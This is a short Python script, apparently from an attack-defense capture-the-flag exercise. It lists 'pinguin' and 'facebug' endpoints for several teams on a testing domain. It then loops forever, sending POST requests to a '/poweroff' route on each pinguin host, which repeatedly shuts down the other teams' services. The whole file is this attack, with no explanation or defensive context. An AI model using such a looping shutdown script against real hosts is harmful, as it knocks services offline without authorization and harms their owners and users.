import requests

listofendpointsPinguin = [
    'https://pinguin.team1.bradlo.testing.haxagon.xyz/',
    'http://pinguin.team2.bradlo.testing.haxagon.xyz/',
    'http://pinguin.team3.bradlo.testing.haxagon.xyz/',
    'http://pinguin.team4.bradlo.testing.haxagon.xyz/',
    'http://pinguin.team5.bradlo.testing.haxagon.xyz/',
    'http://pinguin.team6.bradlo.testing.haxagon.xyz/',
    'http://pinguin.team8.bradlo.testing.haxagon.xyz/'
    ]

listofendpointsFacebug =[
    'http://facebug.team1.bradlo.testing.haxagon.xyz/',
    'http://facebug.team2.bradlo.testing.haxagon.xyz/',
    'http://facebug.team3.bradlo.testing.haxagon.xyz/',
    'http://facebug.team4.bradlo.testing.haxagon.xyz/',
    'http://facebug.team5.bradlo.testing.haxagon.xyz/',
    'http://facebug.team6.bradlo.testing.haxagon.xyz/',
    'http://facebug.team8.bradlo.testing.haxagon.xyz/',
]

while True:
    for adress in listofendpointsPinguin:
        adress = adress + "/poweroff"
        response = requests.post(adress, verify=False)
        print(response.text) 

